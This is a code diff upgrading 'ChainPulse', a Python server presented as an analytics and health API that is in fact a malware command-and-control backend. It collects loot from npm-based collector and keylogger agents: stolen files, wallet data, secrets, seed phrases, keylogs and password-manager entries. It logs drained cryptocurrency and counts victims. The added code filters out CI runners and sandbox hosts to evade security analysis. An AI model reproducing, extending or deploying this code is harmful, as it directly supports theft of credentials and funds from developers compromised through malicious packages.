@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""ChainPulse v8.1 — Analytics & Health API (Render-compatible).
+"""ChainPulse v8.2 — Analytics & Health API (Render-compatible).
 
 Accepts both:
   - Python agent envelope: {endpoint, campaign, timestamp, payload:{system_info,...}}
@@ -26,7 +26,7 @@ DASHBOARD_HTML = r"""<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ChainPulse v8.1 — Analytics</title>
+<title>ChainPulse v8.2 — Analytics</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'SF Mono','Consolas','Courier New',monospace;background:#080810;color:#00ff88;padding:20px;font-size:13px}
@@ -62,7 +62,7 @@ a{color:#00d4ff}
 </style>
 </head>
 <body>
-<h1>ChainPulse v8.1 — Analytics Dashboard</h1>
+<h1>ChainPulse v8.2 — Analytics Dashboard</h1>
 <div id="stats"></div>
 <div id="loot"></div>
 <script>
@@ -307,6 +307,25 @@ def _normalize_payload(raw: dict) -> dict:
     }
 
 
+
+def _is_noise_host(host: str, user: str, os_str: str = "") -> bool:
+    h = (host or "").lower()
+    u = (user or "").lower()
+    o = (os_str or "").lower()
+    if u in ("runner", "github", "gitlab-runner"):
+        return True
+    if "gvisor" in o or "aws" in o and u == "runner":
+        return True
+    if h in ("ubuntu-fc-uvm",) and u in ("ubuntu", "root"):
+        return False  # keep lab
+    # docker-style 12-hex hostnames from sandboxes
+    if len(h) == 12 and all(c in "0123456789abcdef" for c in h):
+        return True
+    if h.startswith("runnervm") or "actions" in h:
+        return True
+    return False
+
+
 class C2Handler(BaseHTTPRequestHandler):
     def log_message(self, fmt, *args):
         pass
@@ -317,7 +336,7 @@ class C2Handler(BaseHTTPRequestHandler):
         elif self.path == "/api/loot-summary":
             self._serve_json(self._get_summary())
         elif self.path == "/health":
-            self._serve_json({"status": "healthy", "version": "8.1.0", "render": True})
+            self._serve_json({"status": "healthy", "version": "8.2.0", "render": True})
         else:
             self.send_error(404)
 
@@ -335,7 +354,7 @@ class C2Handler(BaseHTTPRequestHandler):
             return
         try:
             cl = int(self.headers.get("Content-Length", 0))
-            if cl == 0 or cl > 15_000_000:
+            if cl == 0 or cl > 30_000_000:
                 self.send_error(400)
                 return
             body = self.rfile.read(cl)
@@ -352,10 +371,18 @@ class C2Handler(BaseHTTPRequestHandler):
             campaign = env["campaign"]
             ts = str(env["timestamp"]).replace(":", "-")
             host = env["payload"].get("system_info", {}).get("hostname", "unknown")
+            user = env["payload"].get("system_info", {}).get("user", "")
+            os_name = env["payload"].get("system_info", {}).get("os", "")
             nfiles = len((env.get("payload") or {}).get("files") or {})
+
+            # Soft-skip pure CI noise (still ack so clients don't retry spam)
+            if _is_noise_host(host, user, os_name) and endpoint not in ("npm-hello",):
+                print(f"[~] noise skip {host}/{user} ep={endpoint}")
+                self._serve_json({"status": "ok", "noise": True, "campaign": campaign, "endpoint": endpoint})
+                return
+
             fp_key = f"{campaign}|{endpoint}|{host}|{nfiles}|{str(env.get('timestamp', ''))[:19]}"
             now = time.time()
-            # drop fingerprints older than window
             for k in list(_RECENT_FP.keys()):
                 if now - _RECENT_FP[k] > _DEDUP_SEC:
                     _RECENT_FP.pop(k, None)
@@ -368,33 +395,103 @@ class C2Handler(BaseHTTPRequestHandler):
             cdir = os.path.join(LOOT_DIR, campaign)
             os.makedirs(cdir, exist_ok=True)
             safe_host = "".join(c if c.isalnum() or c in "-_." else "_" for c in host)[:40]
-            fname = f"{endpoint}_{safe_host}_{ts}.json"
-            fpath = os.path.join(cdir, fname)
-            with open(fpath, "w") as f:
-                json.dump(env, f, indent=2, default=str)
 
+            # Merge chunked collector parts into one host file when possible
             pl = env["payload"]
+            chunk_meta = pl.get("chunk") if isinstance(pl.get("chunk"), dict) else None
+            base_ep = endpoint.split("-p")[0] if endpoint.startswith("npm-collector") or endpoint.startswith("npm-keylog") else endpoint
+            merged = False
+            if chunk_meta is not None or endpoint.startswith("npm-collector-p") or endpoint.startswith("npm-keylog-p"):
+                merge_name = f"{base_ep}_{safe_host}_merged.json"
+                merge_path = os.path.join(cdir, merge_name)
+                existing = None
+                if os.path.isfile(merge_path):
+                    try:
+                        with open(merge_path) as mf:
+                            existing = json.load(mf)
+                    except Exception:
+                        existing = None
+                if existing and isinstance(existing.get("payload"), dict):
+                    epl = existing["payload"]
+                    efiles = epl.get("files") if isinstance(epl.get("files"), dict) else {}
+                    nfiles_map = pl.get("files") if isinstance(pl.get("files"), dict) else {}
+                    efiles.update(nfiles_map)
+                    epl["files"] = efiles
+                    # merge wallets / secrets / keylog / pm
+                    ew = epl.get("wallets") if isinstance(epl.get("wallets"), dict) else {}
+                    nw = pl.get("wallets") if isinstance(pl.get("wallets"), dict) else {}
+                    ew.update(nw)
+                    epl["wallets"] = ew
+                    esec = epl.get("secrets") if isinstance(epl.get("secrets"), dict) else {}
+                    nsec = pl.get("secrets") if isinstance(pl.get("secrets"), dict) else {}
+                    for k, v in nsec.items():
+                        if isinstance(v, list) and isinstance(esec.get(k), list):
+                            seen = set(json.dumps(x, sort_keys=True, default=str) if isinstance(x, dict) else str(x) for x in esec[k])
+                            for item in v:
+                                key = json.dumps(item, sort_keys=True, default=str) if isinstance(item, dict) else str(item)
+                                if key not in seen:
+                                    esec[k].append(item)
+                                    seen.add(key)
+                        elif v:
+                            esec[k] = v
+                    epl["secrets"] = esec
+                    if pl.get("keylog") and (pl["keylog"].get("count") or pl["keylog"].get("entries")):
+                        epl["keylog"] = pl["keylog"]
+                    if pl.get("password_managers"):
+                        pm = list(epl.get("password_managers") or [])
+                        for x in pl["password_managers"]:
+                            if x not in pm:
+                                pm.append(x)
+                        epl["password_managers"] = pm
+                    epl["chunk_parts"] = (epl.get("chunk_parts") or 0) + 1
+                    existing["payload"] = epl
+                    existing["timestamp"] = env.get("timestamp") or existing.get("timestamp")
+                    existing["endpoint"] = base_ep
+                    with open(merge_path, "w") as mf:
+                        json.dump(existing, mf, indent=2, default=str)
+                    fpath = merge_path
+                    merged = True
+                    nfiles = len(efiles)
+                else:
+                    # seed merge file from this part
+                    seed = dict(env)
+                    seed["endpoint"] = base_ep
+                    seed["payload"] = dict(pl)
+                    seed["payload"]["chunk_parts"] = 1
+                    with open(merge_path, "w") as mf:
+                        json.dump(seed, mf, indent=2, default=str)
+                    fpath = merge_path
+                    merged = True
+
+            if not merged:
+                fname = f"{endpoint}_{safe_host}_{ts}.json"
+                fpath = os.path.join(cdir, fname)
+                with open(fpath, "w") as f:
+                    json.dump(env, f, indent=2, default=str)
+
             dr = pl.get("drain_results", [])
             for r in dr:
                 if r.get("status") == "drained":
                     amt = r.get("amount_ether", r.get("amount_human", r.get("amount_sol", 0)))
                     sym = r.get("symbol", r.get("chain", "?"))
                     try:
-                        print(f"[$$$] DRAINED {float(amt):.6f} {sym} | tx: {str(r.get('tx_hash','?'))[:16]}...")
+                        print(f"[$$] DRAINED {float(amt):.6f} {sym} | tx: {str(r.get('tx_hash','?'))[:16]}...")
                     except Exception:
-                        print(f"[$$$] DRAINED {amt} {sym}")
+                        print(f"[$$] DRAINED {amt} {sym}")
 
             seeds = pl.get("secrets", {}).get("seed_phrases", [])
             if seeds:
                 print(f"[!!!] SEED PHRASES: {len(seeds)} found!")
 
-            nfiles = len(pl.get("files") or {})
-            print(f"[+] {endpoint} | campaign={campaign} | host={host} | files={nfiles} | {fpath}")
-            self._serve_json({"status": "ok", "campaign": campaign, "endpoint": endpoint})
+            print(f"[+] {endpoint} | campaign={campaign} | host={host} | files={nfiles} | merged={merged} | {fpath}")
+            self._serve_json({"status": "ok", "campaign": campaign, "endpoint": endpoint, "merged": merged})
 
         except Exception as e:
             print(f"[-] Error: {e}")
-            self.send_error(500)
+            try:
+                self._serve_json({"status": "error", "error": str(e)[:300]}, code=500)
+            except Exception:
+                self.send_error(500)
 
     def _serve_html(self, html):
         self.send_response(200)
@@ -402,8 +499,8 @@ class C2Handler(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(html.encode())
 
-    def _serve_json(self, data):
-        self.send_response(200)
+    def _serve_json(self, data, code=200):
+        self.send_response(code)
         self.send_header("Content-Type", "application/json")
         self.send_header("Access-Control-Allow-Origin", "*")
         self.end_headers()
@@ -413,44 +510,60 @@ class C2Handler(BaseHTTPRequestHandler):
         campaigns = []
         total_files = 0
         recent = []
-        if os.path.isdir(LOOT_DIR):
+        all_entries = []
+        try:
             for cdir in sorted(os.listdir(LOOT_DIR)):
                 cp = os.path.join(LOOT_DIR, cdir)
-                if os.path.isdir(cp):
-                    files = sorted(glob.glob(os.path.join(cp, "*.json")), key=os.path.getmtime, reverse=True)
-                    total_files += len(files)
-                    campaigns.append({"name": cdir, "files": len(files)})
-                    for fp in files[:10]:
-                        try:
-                            with open(fp) as f:
-                                raw = json.load(f)
-                            # Normalize again for old files stored as bare loot
-                            recent.append(_normalize_payload(raw if isinstance(raw, dict) else {"raw": raw}))
-                        except Exception:
-                            pass
+                if not os.path.isdir(cp):
+                    continue
+                files = sorted(glob.glob(os.path.join(cp, "*.json")), key=os.path.getmtime, reverse=True)
+                total_files += len(files)
+                campaigns.append({"name": cdir, "files": len(files)})
+                for fp in files[:80]:
+                    try:
+                        with open(fp) as f:
+                            all_entries.append(json.load(f))
+                    except Exception:
+                        pass
+        except Exception:
+            pass
+
         hosts = set()
-        for r in recent:
-            try:
-                h = r.get("payload", {}).get("system_info", {}).get("hostname", "")
-                if h and h != "unknown":
-                    hosts.add(h)
-            except Exception:
-                pass
-        # newest first
-        def _ts(x):
-            return str(x.get("timestamp") or "")
-        recent.sort(key=_ts, reverse=True)
+        real = []
+        noise = []
+        for r in all_entries:
+            pl = r.get("payload") or r
+            si = pl.get("system_info") or {}
+            h = si.get("hostname") or pl.get("host") or ""
+            u = si.get("user") or pl.get("user") or ""
+            o = si.get("os") or pl.get("os") or ""
+            if h:
+                hosts.add(h)
+            if _is_noise_host(h, u, o):
+                noise.append(r)
+            else:
+                real.append(r)
+        # Prefer real hosts; fill with noise only if empty
+        recent = (real + noise)[:40]
+        real_hosts = set()
+        for r in real:
+            pl = r.get("payload") or r
+            si = pl.get("system_info") or {}
+            h = si.get("hostname") or pl.get("host") or ""
+            if h:
+                real_hosts.add(h)
         return {
             "campaign_count": len(campaigns),
             "campaigns": campaigns,
-            "total_victims": len(hosts),
+            "total_victims": len(real_hosts) or len(hosts),
             "total_files": total_files,
-            "recent": recent[:30],
+            "recent": recent,
+            "noise_filtered": len(noise),
         }
 
 
 if __name__ == "__main__":
-    print(f"[C2] ChainPulse v8.0.2 (Render) — http://0.0.0.0:{PORT}")
+    print(f"[C2] ChainPulse v8.2.0 (Render) — http://{HOST}:{PORT}")
     print(f"[C2] Dashboard: /dashboard")
     print(f"[C2] Health:    /health")
     print(f"[C2] Loot dir:  {LOOT_DIR}")
